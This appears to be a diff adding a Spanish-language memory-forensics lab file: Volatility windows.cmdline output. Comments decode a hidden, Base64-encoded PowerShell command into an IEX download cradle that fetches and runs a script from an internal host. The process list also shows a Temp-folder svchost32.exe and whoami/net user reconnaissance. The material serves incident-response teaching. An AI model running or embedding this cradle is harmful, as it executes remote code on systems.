@@ -1,0 +1,17 @@
+# Salida de: vol -f memoria.raw windows.cmdline
+# Dataset de laboratorio IC UT6. La linea de comandos de powershell.exe (3120) es la
+# prueba del download cradle. Descodifica el parametro -enc (Base64 UTF-16LE) para leerlo.
+
+PID    Process         Args
+2984   explorer.exe    C:\Windows\explorer.exe
+2760   OneDrive.exe    "C:\Users\admin\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
+3120   powershell.exe  powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADYANgA6ADgAMAA4ADAALwBhAC4AcABzADEAJwApAA==
+4812   svchost32.exe   "C:\Users\admin\AppData\Local\Temp\svchost32.exe"
+5044   cmd.exe         C:\Windows\System32\cmd.exe /c whoami /priv & net user
+
+# Descodificacion del -enc de PID 3120 (Base64 -> UTF-16LE):
+#   IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.66:8080/a.ps1')
+#
+# Comprobacion en Linux:
+#   echo 'SQBF...AKQA=' | base64 -d | iconv -f UTF-16LE -t UTF-8
+# Esto es un download cradle clasico (T1059.001 PowerShell + T1105 Ingress Tool Transfer).
